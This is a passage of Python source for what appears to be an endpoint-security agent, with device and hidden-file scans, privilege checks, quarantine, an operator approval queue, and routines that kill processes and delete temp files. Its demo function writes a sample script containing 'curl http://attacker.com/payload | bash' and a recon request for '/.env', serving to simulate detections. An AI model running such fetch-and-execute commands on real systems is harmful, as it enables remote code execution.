                for partition in psutil.disk_partitions(all=True):
                    opts = (partition.opts or "").lower()
                    dev = (partition.device or "").lower()
                    mountpoint = partition.mountpoint or ""
                    if "removable" in opts or "usb" in dev or mountpoint.startswith('/media/') or mountpoint.startswith('/run/media/'):
                        _record(partition.device, "disk_partition", mountpoint, {"opts": partition.opts})
        except Exception:
            pass

        for cmd in (["lsusb"], ["usb-devices"]):
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
                if result.returncode != 0:
                    continue
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    if cmd[0] == "lsusb" and line.lower().startswith("bus "):
                        _record(line, "lsusb")
                    elif cmd[0] == "usb-devices" and line.startswith("T:"):
                        _record(line, "usb-devices")
            except Exception:
                continue

        elapsed = round(time.time() - start, 2)
        self.add_event("INFO", f"USB scan: {len(devices)} devices found in {elapsed}s")
        self._last_usb_scan_result = {"success": True, "devices": devices, "scan_time": elapsed}
        return self._last_usb_scan_result

    # --- Hidden file scan ---
    def scan_hidden_files(self) -> dict:
        self.add_event("INFO", "Starting hidden file scan...")
        results = []
        if platform.system().lower() != "windows":
            return {"success": True, "findings": [], "message": "Hidden file scan only supported on Windows"}

        suspicious_locations = [
            os.path.expandvars(r'%TEMP%'), os.path.expandvars(r'%APPDATA%'),
            os.path.expandvars(r'%LOCALAPPDATA%'), os.path.expandvars(r'%PROGRAMDATA%'),
            os.path.join(os.path.expanduser('~'), 'Downloads'),
            os.path.join(os.path.expanduser('~'), 'Desktop'),
        ]
        dangerous_exts = {'.exe', '.dll', '.bat', '.ps1', '.vbs', '.js', '.scr', '.com',
                          '.cmd', '.hta', '.msi', '.pif', '.wsf', '.wsh'}

        for loc in suspicious_locations:
            if not os.path.isdir(loc):
                continue
            try:
                dirs_to_scan = [(loc, 0)]
                count = 0
                while dirs_to_scan and count < 500:
                    current, depth = dirs_to_scan.pop(0)
                    try:
                        for entry in os.scandir(current):
                            count += 1
                            if count > 500:
                                break
                            try:
                                if entry.is_dir() and depth < 2:
                                    dirs_to_scan.append((entry.path, depth + 1))
                                if not entry.is_file():
                                    continue
                                import ctypes
                                attrs = ctypes.windll.kernel32.GetFileAttributesW(entry.path)
                                if attrs == -1:
                                    continue
                                is_hidden = bool(attrs & 0x2)
                                is_system = bool(attrs & 0x4)
                                if is_hidden and not is_system:
                                    ext = os.path.splitext(entry.name)[1].lower()
                                    severity = 'critical' if ext in dangerous_exts else 'medium'
                                    results.append({
                                        "path": entry.path, "type": "Hidden File",
                                        "severity": severity,
                                        "detail": f"Ext: {ext}, Size: {entry.stat().st_size} bytes"
                                    })
                            except (PermissionError, OSError):
                                continue
                    except (PermissionError, OSError):
                        continue
            except Exception:
                continue

        # Check ADS
        try:
            user_dir = os.path.expanduser('~')
            for subdir in ['Desktop', 'Downloads', 'Documents']:
                target = os.path.join(user_dir, subdir)
                if not os.path.isdir(target):
                    continue
                result = subprocess.run(
                    ['cmd', '/c', f'dir /r /s "{target}"'],
                    capture_output=True, text=True, timeout=30)
                for line in result.stdout.splitlines():
                    if ':$DATA' in line and line.count(':') >= 3:
                        cleaned = line.strip()[:200]
                        results.append({"path": cleaned, "type": "ADS Stream",
                                        "severity": "high", "detail": "Alternate Data Stream detected"})
        except Exception:
            pass

        # Recent temp executables
        try:
            temp_dir = tempfile.gettempdir()
            for entry in os.scandir(temp_dir):
                try:
                    if entry.is_file():
                        ext = os.path.splitext(entry.name)[1].lower()
                        if ext in dangerous_exts:
                            age_hours = (time.time() - entry.stat().st_mtime) / 3600
                            if age_hours < 24:
                                results.append({
                                    "path": entry.path, "type": "Recent Temp Exe",
                                    "severity": "high",
                                    "detail": f"{ext} file, created {age_hours:.1f}h ago"
                                })
                except (PermissionError, OSError):
                    continue
        except Exception:
            pass

        self.add_event("INFO", f"Hidden scan done: {len(results)} findings")
        return {"success": True, "findings": results}

    # --- Privilege scan ---
    def scan_privileges(self) -> dict:
        self.add_event("INFO", "Starting admin privilege scan...")
        results = []
        is_admin = False
        user_info = ""

        try:
            import ctypes
            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            pass

        try:
            result = subprocess.run(['whoami'], capture_output=True, text=True, timeout=5)
            user_info = result.stdout.strip()
        except Exception:
            user_info = "unknown"

        results.append({
            "type": "Admin Status", "name": "Current User",
            "severity": "high" if is_admin else "info",
            "detail": f"{'Running as admin' if is_admin else 'Standard user'} | {user_info}"
        })

        if platform.system().lower() == "windows":
            # Check privileges
            try:
                result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=10)
                dangerous_privs = [
                    'SeDebugPrivilege', 'SeTcbPrivilege', 'SeAssignPrimaryTokenPrivilege',
                    'SeLoadDriverPrivilege', 'SeRestorePrivilege', 'SeTakeOwnershipPrivilege',
                    'SeImpersonatePrivilege', 'SeCreateTokenPrivilege',
                    'SeBackupPrivilege', 'SeSecurityPrivilege',
                ]
                for priv in dangerous_privs:
                    if priv in result.stdout:
                        line_part = result.stdout.split(priv)[1].split('\n')[0]
                        enabled = 'Enabled' in line_part
                        results.append({
                            "type": "Privilege", "name": priv,
                            "severity": "critical" if enabled else "medium",
                            "detail": "ENABLED" if enabled else "Disabled"
                        })
            except Exception:
                pass

            # Check scheduled tasks running as SYSTEM
            try:
                result = subprocess.run(['schtasks', '/query', '/fo', 'CSV', '/v'],
                                        capture_output=True, text=True, timeout=30)
                lines = result.stdout.splitlines()
                for line in lines[1:]:
                    parts = line.strip('"').split('","')
                    if len(parts) > 7:
                        task_name = parts[0]
                        run_as = parts[7] if len(parts) > 7 else ''
                        status = parts[3] if len(parts) > 3 else ''
                        if 'SYSTEM' in run_as.upper() and '\\Microsoft\\' not in task_name:
                            if 'Ready' in status or 'Running' in status:
                                results.append({
                                    "type": "SYSTEM Task", "name": task_name,
                                    "severity": "high",
                                    "detail": f"Runs as {run_as}, Status: {status}"
                                })
            except Exception:
                pass

            # Check suspicious SYSTEM processes
            if psutil:
                suspicious_as_system = ['cmd.exe', 'powershell.exe', 'pwsh.exe',
                                        'python.exe', 'python3.exe', 'node.exe',
                                        'wscript.exe', 'cscript.exe', 'mshta.exe']
                for proc in psutil.process_iter(['pid', 'name', 'username']):
                    try:
                        info = proc.info
                        username = (info.get('username') or '').upper()
                        pname = (info.get('name') or '').lower()
                        if 'SYSTEM' in username and pname in suspicious_as_system:
                            results.append({
                                "type": "SYSTEM Process", "name": f"{pname} (PID {info['pid']})",
                                "severity": "critical",
                                "detail": f"Running as {username}"
                            })
                        base_name = pname.replace('.exe', '')
                        if base_name in SUSPICIOUS_PROCESS_NAMES and base_name not in SERAPH_INTEGRATION_PROCESSES:
                            results.append({
                                "type": "Offensive Tool", "name": f"{pname} (PID {info['pid']})",
                                "severity": "critical",
                                "detail": f"Known offensive tool running as {info.get('username', '?')}"
                            })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue

            # UAC settings
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                     r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                enable_lua, _ = winreg.QueryValueEx(key, 'EnableLUA')
                consent_prompt, _ = winreg.QueryValueEx(key, 'ConsentPromptBehaviorAdmin')
                winreg.CloseKey(key)
                if enable_lua == 0:
                    results.append({"type": "UAC", "name": "EnableLUA",
                                    "severity": "critical", "detail": "UAC is DISABLED"})
                else:
                    results.append({"type": "UAC", "name": "EnableLUA",
                                    "severity": "info", "detail": "UAC is enabled"})
                if consent_prompt == 0:
                    results.append({"type": "UAC", "name": "ConsentPrompt",
                                    "severity": "high", "detail": "Admin auto-approve without prompt"})
            except Exception:
                pass

            # Admin group members
            try:
                result = subprocess.run(['net', 'localgroup', 'Administrators'],
                                        capture_output=True, text=True, timeout=10)
                in_members = False
                for line in result.stdout.splitlines():
                    if '---' in line:
                        in_members = True
                        continue
                    if in_members and line.strip() and 'command completed' not in line.lower():
                        results.append({"type": "Admin Group", "name": line.strip(),
                                        "severity": "medium", "detail": "Member of local Administrators group"})
            except Exception:
                pass

            # Firewall state
            try:
                result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                        capture_output=True, text=True, timeout=10)
                for line in result.stdout.splitlines():
                    if 'State' in line and 'OFF' in line.upper():
                        results.append({"type": "Firewall", "name": "Profile",
                                        "severity": "critical", "detail": f"Firewall DISABLED: {line.strip()}"})
            except Exception:
                pass

            # Defender status
            try:
                result = subprocess.run(
                    ['powershell', '-Command',
                     'Get-MpPreference | Select-Object DisableRealtimeMonitoring | Format-List'],
                    capture_output=True, text=True, timeout=15)
                if 'True' in result.stdout:
                    results.append({"type": "Defender", "name": "RealTime",
                                    "severity": "critical", "detail": "Real-time protection DISABLED"})
                else:
                    results.append({"type": "Defender", "name": "RealTime",
                                    "severity": "info", "detail": "Real-time protection enabled"})
            except Exception:
                pass

        self.add_event("INFO", f"Admin scan done: {len(results)} findings")
        return {"success": True, "findings": results, "is_admin": is_admin, "user": user_info}

    # --- Quarantine & Response Ops ---
    def quarantine_file(self, file_path: str, is_sandbox: bool = False, threat_name: Optional[str] = None, threat_type: Optional[str] = None) -> dict:
        try:
            # For sandbox demo, we might just simulate the move or use the same quarantine logic
            new_path = self.agent.quarantine_file(file_path)
            self.quarantine_items.append({"path": new_path, "original": file_path, "status": "quarantined" if not is_sandbox else "sandboxed"})
            self.add_event("INFO", f"{'Sandboxed' if is_sandbox else 'Quarantined'} {file_path}")

            # Notify the main backend (port 3000 view) about the detection
            try:
                # Determine names
                if not threat_name:
                    threat_name = "Suspicious Activity" if is_sandbox else ("EICAR Test Malware" if "eicar" in file_path.lower() else os.path.basename(file_path))
                if not threat_type:
                    threat_type = "suspicious" if is_sandbox else ("virus" if "eicar" in file_path.lower() else "unknown")

                self._backend_request(
                    "POST",
                    "/quarantine/demo-ingest",
                    payload={
                        "filepath": file_path,
                        "threat_name": threat_name,
                        "threat_type": threat_type,
                        "detection_source": "metatron-unified-agent",
                        "is_sandbox": is_sandbox,
                        "source_ip": "192.168.1.100",
                        "metadata": {
                            "quarantined_path": new_path,
                            "agent_id": self.agent.config.agent_id,
                            "hostname": socket.gethostname(),
                            "demo_flow": "sandbox" if is_sandbox else "quarantine"
                        }
                    },
                    timeout=5.0
                )
            except Exception as be_err:
                logger.warning(f"Failed to sync response to backend: {be_err}")

            return {"success": True, "quarantined_path": new_path, "is_sandbox": is_sandbox}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def trigger_demo_scan(self, scan_type: str) -> dict:
        """Triggers a simulated detection for the SOAR demo."""
        if scan_type == "virus":
            # Flow: Auto-Quarantine (Scenario: Known Malware)
            dummy_path = "/tmp/seraph_eicar_test.com"
            with open(dummy_path, "w") as f:
                f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            return self.quarantine_file(dummy_path, is_sandbox=False, threat_name="EICAR Standard Test File", threat_type="virus")
        elif scan_type == "sandbox":
            # Flow: HITL Approval (Scenario: Suspicious Script)
            dummy_path = "/tmp/suspicious_script.sh"
            with open(dummy_path, "w") as f:
                f.write("#!/bin/bash\necho 'Simulating suspicious behavior...'\ncurl http://attacker.com/payload | bash")
            return self.quarantine_file(dummy_path, is_sandbox=True, threat_name="Active-Malicious-Script.sh", threat_type="suspicious")
        elif scan_type == "deception":
            # Direct deception trigger (Trap Path Recon)
            dummy_path = "/tmp/recon_scanner.py"
            with open(dummy_path, "w") as f:
                f.write("# Recon scanner hit trap path\nimport requests\nrequests.get('http://target/.env')")
            return self.quarantine_file(dummy_path, is_sandbox=False, threat_name="Recon Scanner (Trap Hit)", threat_type="recon")
        else:
            return {"success": False, "error": f"Unknown scan type: {scan_type}"}

    def restore_quarantine_item(self, path: str) -> dict:
        try:
            self.agent.restore_quarantine(path)
            self.quarantine_items = [q for q in self.quarantine_items if q["path"] != path]
            self.add_event("INFO", f"Restored {path}")
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def remove_quarantine_item(self, path: str) -> dict:
        try:
            self.agent.remove_quarantine(path)
            self.quarantine_items = [q for q in self.quarantine_items if q["path"] != path]
            self.add_event("INFO", f"Removed {path} from quarantine")
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- Command management ---
    def get_pending_commands(self) -> list:
        return self.pending_commands

    def get_command_history(self) -> list:
        return list(self.command_history)

    def approve_command(self, command_id: str) -> dict:
        cmd = None
        for c in self.pending_commands:
            if c.get("command_id") == command_id:
                cmd = c
                break
        if not cmd:
            return {"success": False, "error": "Command not found"}

        cmd_type = cmd.get("type", "unknown")
        cmd_params = cmd.get("params", {})
        self.log(f"Approved command {command_id}: {cmd_type}")

        def _run():
            try:
                result_data = self.agent._execute_command(cmd_type, cmd_params)
                self.agent._ack_command(command_id, result_data)
                ok = result_data.get("success", False)
                out = result_data.get("output", str(result_data))
                self.command_history.appendleft({
                    "id": command_id, "type": cmd_type,
                    "status": "OK" if ok else "FAIL",
                    "result": out[:200], "time": datetime.now().strftime("%H:%M:%S")
                })
                self.log(f"Command {cmd_type} {'succeeded' if ok else 'FAILED'}: {out[:100]}")
            except Exception as e:
                self.agent._ack_command(command_id, {"success": False, "error": str(e)})
                self.command_history.appendleft({
                    "id": command_id, "type": cmd_type,
                    "status": "ERROR", "result": str(e)[:200],
                    "time": datetime.now().strftime("%H:%M:%S")
                })
                self.log(f"Command {cmd_type} error: {e}", "ERROR")

        threading.Thread(target=_run, daemon=True).start()
        self.pending_commands = [c for c in self.pending_commands if c.get("command_id") != command_id]
        return {"success": True, "message": f"Executing {cmd_type}"}

    def approve_all_commands(self) -> dict:
        ids = [c.get("command_id") for c in self.pending_commands]
        for cid in ids:
            self.approve_command(cid)
        return {"success": True, "approved": len(ids)}

    def reject_command(self, command_id: str) -> dict:
        cmd = None
        for c in self.pending_commands:
            if c.get("command_id") == command_id:
                cmd = c
                break
        if not cmd:
            return {"success": False, "error": "Command not found"}
        cmd_type = cmd.get("type", "unknown")
        self.agent._ack_command(command_id, {
            "success": False, "output": "Rejected by operator", "rejected": True
        })
        self.command_history.appendleft({
            "id": command_id, "type": cmd_type, "status": "REJECTED",
            "result": "Rejected by operator", "time": datetime.now().strftime("%H:%M:%S")
        })
        self.log(f"Rejected command {command_id}: {cmd_type}")
        self.pending_commands = [c for c in self.pending_commands if c.get("command_id") != command_id]
        return {"success": True}

    def queue_command(self, cmd: dict):
        """Called when the agent polls a new command from the server."""
        self.pending_commands.append(cmd)
        self.add_event("INFO", f"New command: {cmd.get('type', '?')}")

    # =================================================================
    # AUTO-REDUCE: forceful resource reduction to target percentiles
    # =================================================================
    _PROTECTED = frozenset({
        'system', 'idle', 'csrss', 'wininit', 'winlogon', 'services',
        'lsass', 'smss', 'svchost', 'explorer', 'dwm', 'registry',
        'memory compression', 'secure system',
        'python', 'pythonw', 'python3', 'cmd', 'powershell', 'pwsh',
        'conhost', 'fontdrvhost', 'sihost', 'taskhostw', 'runtimebroker',
        'searchhost', 'startmenuexperiencehost', 'textinputhost',
        'shellexperiencehost', 'securityhealthservice', 'msmpeng',
        'antimalwareserviceexecutable', 'wudfhost', 'dllhost',
        'spoolsv', 'audiodg', 'ctfmon', 'flask',
    })

    def _auto_reduce_monitor_loop(self):
        """Background loop: check resources every 10s and force-reduce
        when above thresholds. Replaces the manual-only approach."""
        if not psutil:
            return
        time.sleep(15)  # let system settle after startup
        while True:
            try:
                if self.ar_enabled:
                    cpu = self._cpu_value
                    mem = psutil.virtual_memory().percent
                    try:
                        disk = psutil.disk_usage('/').percent
                    except Exception:
                        disk = psutil.disk_usage('C:\\').percent

                    now = time.time()
                    if now - self._last_auto_reduce_time < 15:
                        time.sleep(10)
                        continue

                    triggered = False
                    if cpu > self.ar_cpu_thresh:
                        threading.Thread(target=self._force_reduce_cpu, daemon=True).start()
                        triggered = True
                    if mem > self.ar_mem_thresh:
                        threading.Thread(target=self._force_reduce_memory, daemon=True).start()
                        triggered = True
                    if disk > self.ar_disk_thresh:
                        threading.Thread(target=self._force_reduce_disk, daemon=True).start()
                        triggered = True
                    if triggered:
                        self._last_auto_reduce_time = now
            except Exception as e:
                logger.warning(f"Auto-reduce monitor error: {e}")
            time.sleep(10)

    def toggle_auto_reduce(self, enabled: bool) -> dict:
        self.ar_enabled = enabled
        self.add_event("INFO", f"Auto-Reduce toggled {'ON' if enabled else 'OFF'}")
        return {"success": True, "enabled": enabled}

    def update_auto_reduce_thresholds(self, cpu: int = None, mem: int = None, disk: int = None) -> dict:
        if cpu is not None:
            self.ar_cpu_thresh = max(10, min(cpu, 99))
        if mem is not None:
            self.ar_mem_thresh = max(10, min(mem, 99))
        if disk is not None:
            self.ar_disk_thresh = max(10, min(disk, 99))
        return {"success": True, "cpu": self.ar_cpu_thresh,
                "mem": self.ar_mem_thresh, "disk": self.ar_disk_thresh}

    def manual_auto_reduce(self) -> dict:
        """Trigger a forceful auto-reduce cycle immediately."""
        cpu = mem_pct = disk_pct = 0
        if psutil:
            try:
                cpu = self._cpu_value
                mem_pct = psutil.virtual_memory().percent
                disk_pct = psutil.disk_usage('/').percent
            except Exception:
                try:
                    disk_pct = psutil.disk_usage('C:\\').percent
                except Exception:
                    pass
        self.add_event("INFO", f"Manual auto-reduce triggered "
                       f"(CPU={cpu:.0f}%>{self.ar_cpu_thresh}% "
                       f"Mem={mem_pct:.0f}%>{self.ar_mem_thresh}% "
                       f"Disk={disk_pct:.0f}%>{self.ar_disk_thresh}%)")

        actions = []
        if cpu > self.ar_cpu_thresh:
            actions.append(f"CPU force-reduce ({cpu:.0f}% -> {self.ar_cpu_thresh}%)")
            threading.Thread(target=self._force_reduce_cpu, daemon=True).start()
        if mem_pct > self.ar_mem_thresh:
            actions.append(f"Memory force-reduce ({mem_pct:.0f}% -> {self.ar_mem_thresh}%)")
            threading.Thread(target=self._force_reduce_memory, daemon=True).start()
        if disk_pct > self.ar_disk_thresh:
            actions.append(f"Disk cleanup ({disk_pct:.0f}% -> {self.ar_disk_thresh}%)")
            threading.Thread(target=self._force_reduce_disk, daemon=True).start()

        if not actions:
            self.log_auto_reduce("ALL", "Within thresholds",
                                 f"CPU={cpu:.0f}% Mem={mem_pct:.0f}% Disk={disk_pct:.0f}%")
            return {"success": True, "message": "All resources within thresholds", "actions": []}
        return {"success": True, "actions": actions,
                "before": {"cpu": round(cpu, 1), "mem": round(mem_pct, 1), "disk": round(disk_pct, 1)}}

    # ---------- FORCE REDUCE CPU ----------
    def _force_reduce_cpu(self):
        """Multi-pass CPU reduction: throttle → affinitize → suspend → terminate.
        Keeps going until CPU% drops below threshold or max rounds exhausted."""
        if not psutil:
            return
        target = self.ar_cpu_thresh
        protected = self._PROTECTED
        my_pid = os.getpid()
        rounds_done = 0
        total_acted = 0

        try:
            for round_num in range(self._ar_max_rounds):
                # Re-measure CPU
                time.sleep(1.5)
                cpu_now = psutil.cpu_percent(interval=1)
                if cpu_now <= target:
                    self.log_auto_reduce('CPU', 'Target reached',
                                         f'CPU at {cpu_now:.1f}% (target {target}%) after {round_num} rounds')
                    break
                rounds_done = round_num + 1

                # Gather CPU hogs fresh each round
                for p in psutil.process_iter(['cpu_percent']):
                    pass
                time.sleep(1)

                hogs = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
                    try:
                        info = proc.info
                        c = info.get('cpu_percent', 0) or 0
                        pname = (info.get('name', '') or '').lower().replace('.exe', '')
                        pid = info.get('pid', 0)
                        if c > 3 and pname not in protected and pid != my_pid:
                            hogs.append((pid, info.get('name', ''), c, proc))
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                hogs.sort(key=lambda x: x[2], reverse=True)
                if not hogs:
                    self.log_auto_reduce('CPU', 'No targets',
                                         f'CPU {cpu_now:.1f}% but no non-system hogs found')
                    break

                # Escalation ladder per round
                for pid, name, c, proc in hogs[:8]:
                    try:
                        # Round 0-2: Lower priority
                        if round_num < 3:
                            if platform.system() == 'Windows':
                                cur = proc.nice()
                                if c > 50 and cur != psutil.IDLE_PRIORITY_CLASS:
                                    proc.nice(psutil.IDLE_PRIORITY_CLASS)
                                    action = 'IDLE priority'
                                elif cur not in (psutil.BELOW_NORMAL_PRIORITY_CLASS,
                                                 psutil.IDLE_PRIORITY_CLASS):
                                    proc.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
                                    action = 'BELOW_NORMAL priority'
                                else:
                                    continue
                            else:
                                cur = proc.nice()
                                new_n = min(cur + 5, 19)
                                if new_n == cur:
                                    continue
                                proc.nice(new_n)
                                action = f'nice {new_n}'

                        # Round 3-4: Limit CPU affinity (halve available cores)
                        elif round_num < 5:
                            try:
                                cur_aff = proc.cpu_affinity()
                                n_cores = len(cur_aff)
                                if n_cores > 1:
                                    new_aff = cur_aff[:max(1, n_cores // 2)]
                                    proc.cpu_affinity(new_aff)
                                    action = f'affinity {n_cores}->{len(new_aff)} cores'
                                else:
                                    continue
                            except (AttributeError, OSError):
                                continue

                        # Round 5-6: Suspend high-CPU processes temporarily
                        elif round_num < 7:
                            if self._ar_aggressive:
                                proc.suspend()
                                # Schedule resume after 10 seconds
                                threading.Timer(10.0, self._safe_resume, args=[pid]).start()
                                action = 'SUSPENDED (10s)'
                            else:
                                continue

                        # Round 7+: Terminate worst offenders
                        else:
                            if self._ar_aggressive and c > 30:
                                proc.terminate()
                                action = 'TERMINATED'
                            else:
                                continue

                        self.agent._throttled_pids.add(pid)
                        total_acted += 1
                        msg = f'{name} PID={pid} CPU={c:.1f}% -> {action}'
                        self.log_auto_reduce('CPU', action, msg)
                        self.add_event('INFO', f'Auto-reduce CPU: {msg}')
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                    except Exception as e:
                        logger.debug(f'CPU reduce pid {pid}: {e}')
                        continue

            # Final measurement
            time.sleep(1)
            final_cpu = psutil.cpu_percent(interval=1)
            self.log_auto_reduce('CPU', 'Cycle complete',
                f'Acted on {total_acted} processes in {rounds_done} rounds. '
                f'CPU: {final_cpu:.1f}% (target {target}%)')
        except Exception as e:
            logger.warning(f'Force-reduce CPU error: {e}')

    def _safe_resume(self, pid: int):
        """Resume a suspended process; ignore if it no longer exists."""
        try:
            p = psutil.Process(pid)
            if p.status() == psutil.STATUS_STOPPED:
                p.resume()
                self.log_auto_reduce('CPU', 'Resumed', f'PID={pid} resumed after suspend')
        except Exception:
            pass

    # ---------- FORCE REDUCE MEMORY ----------
    def _force_reduce_memory(self):
        """Multi-pass memory reduction: trim working sets → terminate hogs.
        Keeps going until memory% drops below threshold."""
        if not psutil:
            return
        target = self.ar_mem_thresh
        protected = self._PROTECTED
        my_pid = os.getpid()
        total_freed_mb = 0
        total_acted = 0

        try:
            for round_num in range(self._ar_max_rounds):
                mem_now = psutil.virtual_memory().percent
                if mem_now <= target:
                    self.log_auto_reduce('Memory', 'Target reached',
                                         f'Memory at {mem_now:.1f}% (target {target}%) after {round_num} rounds')
                    break

                # Gather memory hogs
                hogs = []
                for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'memory_info']):
                    try:
                        info = proc.info
                        mem = info.get('memory_percent', 0) or 0
                        pname = (info.get('name', '') or '').lower().replace('.exe', '')
                        pid = info.get('pid', 0)
                        rss = 0
                        if info.get('memory_info'):
                            rss = info['memory_info'].rss
                        if mem > 1.0 and pname not in protected and pid != my_pid:
                            hogs.append((pid, info.get('name', ''), mem, rss, proc))
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                hogs.sort(key=lambda x: x[2], reverse=True)

                if not hogs:
                    self.log_auto_reduce('Memory', 'No targets',
                                         f'Memory {mem_now:.1f}% but no non-system hogs found')
                    break

                # Round 0-3: Trim working sets (Windows) or just log (Linux)
                if round_num < 4:
                    for pid, name, mem, rss, proc in hogs[:10]:
                        try:
                            if platform.system() == 'Windows':
                                import ctypes
                                PROCESS_SET_QUOTA = 0x0100
                                PROCESS_QUERY_INFO = 0x0400
                                handle = ctypes.windll.kernel32.OpenProcess(
                                    PROCESS_SET_QUOTA | PROCESS_QUERY_INFO, False, pid)
                                if handle:
                                    ctypes.windll.psapi.EmptyWorkingSet(handle)
                                    ctypes.windll.kernel32.CloseHandle(handle)
                                    freed = rss / (1024 * 1024)
                                    total_freed_mb += freed
                                    total_acted += 1
                                    msg = f'{name} PID={pid} Mem={mem:.1f}% RSS={freed:.0f}MB -> trimmed'
                                    self.log_auto_reduce('Memory', 'Trimmed', msg)
                            else:
                                msg = f'{name} PID={pid} Mem={mem:.1f}%'
                                self.log_auto_reduce('Memory', 'High mem', msg)
                        except Exception:
                            continue
                # Round 4+: Terminate worst memory hogs if aggressive
                else:
                    if self._ar_aggressive:
                        for pid, name, mem, rss, proc in hogs[:3]:
                            if mem > 5:  # only kill if using >5% of memory
                                try:
                                    freed = rss / (1024 * 1024)
                                    proc.terminate()
                                    total_acted += 1
                                    total_freed_mb += freed
                                    msg = f'{name} PID={pid} Mem={mem:.1f}% ({freed:.0f}MB) -> TERMINATED'
                                    self.log_auto_reduce('Memory', 'TERMINATED', msg)
                                    self.add_event('WARNING', f'Auto-reduce killed {name} ({freed:.0f}MB)')
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    continue

                time.sleep(2)

            # Final
            final_mem = psutil.virtual_memory().percent
            self.log_auto_reduce('Memory', 'Cycle complete',
                f'Acted on {total_acted} procs, ~{total_freed_mb:.0f}MB freed. '
                f'Memory: {final_mem:.1f}% (target {target}%)')
        except Exception as e:
            logger.warning(f'Force-reduce memory error: {e}')

    # ---------- FORCE REDUCE DISK ----------
    def _force_reduce_disk(self):
        """Multi-pass disk cleanup: temp → caches → logs → Windows Update."""
        if not psutil:
            return
        target = self.ar_disk_thresh
        total_cleaned_mb = 0
        total_files = 0

        try:
            # Phase 1: Temp directories (files > 1 day old)
            temp_dirs = [tempfile.gettempdir()]
            if platform.system() == 'Windows':
                for env_var in ['TEMP', 'TMP']:
                    d = os.environ.get(env_var, '')
                    if d and os.path.isdir(d) and d not in temp_dirs:
                        temp_dirs.append(d)
                local_temp = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp')
                if os.path.isdir(local_temp) and local_temp not in temp_dirs:
                    temp_dirs.append(local_temp)

            for td in temp_dirs:
                cmb, cf = self._clean_dir(td, min_age_days=1, recurse=True)
                total_cleaned_mb += cmb
                total_files += cf

            self.log_auto_reduce('Disk', 'Phase 1: Temp',
                                 f'{total_files} files, {total_cleaned_mb:.1f}MB')

            # Check if still above threshold
            try:
                disk_now = psutil.disk_usage('/').percent
            except Exception:
                disk_now = psutil.disk_usage('C:\\').percent
            if disk_now <= target:
                self.log_auto_reduce('Disk', 'Target reached', f'Disk at {disk_now:.1f}%')
                self._finish_disk_report(total_cleaned_mb, total_files)
                return

            # Phase 2: Browser caches (Chrome, Edge, Firefox)
            if platform.system() == 'Windows':
                local = os.environ.get('LOCALAPPDATA', '')
                browser_caches = [
                    os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Cache'),
                    os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Code Cache'),
                    os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache'),
                    os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default', 'Code Cache'),
                ]
                for cache_dir in browser_caches:
                    if os.path.isdir(cache_dir):
                        cmb, cf = self._clean_dir(cache_dir, min_age_days=0, recurse=True)
                        total_cleaned_mb += cmb
                        total_files += cf

                self.log_auto_reduce('Disk', 'Phase 2: Browser caches',
                                     f'{total_files} total files, {total_cleaned_mb:.1f}MB')

            # Check again
            try:
                disk_now = psutil.disk_usage('/').percent
            except Exception:
                disk_now = psutil.disk_usage('C:\\').percent
            if disk_now <= target:
                self.log_auto_reduce('Disk', 'Target reached', f'Disk at {disk_now:.1f}%')
                self._finish_disk_report(total_cleaned_mb, total_files)
                return

            # Phase 3: Python __pycache__ dirs
            home = os.path.expanduser('~')
            for root_dir, dirs, files in os.walk(home):
                if '__pycache__' in root_dir:
                    cmb, cf = self._clean_dir(root_dir, min_age_days=0, recurse=False)
                    total_cleaned_mb += cmb
                    total_files += cf
                # Don't recurse too deep
                depth = root_dir.replace(home, '').count(os.sep)
                if depth > 4:
                    dirs.clear()

            # Phase 4 (Windows): Run disk cleanup utility
            if platform.system() == 'Windows':
                try:
                    subprocess.run(['cleanmgr', '/d', 'C', '/sagerun:1'],
                                   capture_output=True, timeout=120)
                    self.log_auto_reduce('Disk', 'Phase 4: cleanmgr', 'Windows Disk Cleanup triggered')
                except Exception:
                    pass

            self._finish_disk_report(total_cleaned_mb, total_files)
        except Exception as e:
            logger.warning(f'Force-reduce disk error: {e}')

    def _clean_dir(self, path: str, min_age_days: float = 1, recurse: bool = False) -> tuple:
        """Delete files in a directory. Returns (cleaned_mb, cleaned_count)."""
        cleaned_mb = 0
        cleaned_count = 0
        try:
            if recurse:
                for root, dirs, files in os.walk(path, topdown=False):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath)
                            age = (time.time() - st.st_mtime) / 86400
                            if age >= min_age_days:
                                size = st.st_size
                                os.unlink(fpath)
                                cleaned_mb += size / (1024 * 1024)
                                cleaned_count += 1
                        except (PermissionError, OSError):
                            continue
                    # Try removing empty dirs
                    for d in dirs:
                        try:
                            os.rmdir(os.path.join(root, d))
                        except OSError:
                            pass
            else:
                for entry in os.scandir(path):
                    try:
                        if entry.is_file():
                            st = entry.stat()
                            age = (time.time() - st.st_mtime) / 86400
                            if age >= min_age_days:
                                cleaned_mb += st.st_size / (1024 * 1024)
                                os.unlink(entry.path)
                                cleaned_count += 1
                    except (PermissionError, OSError):
                        continue
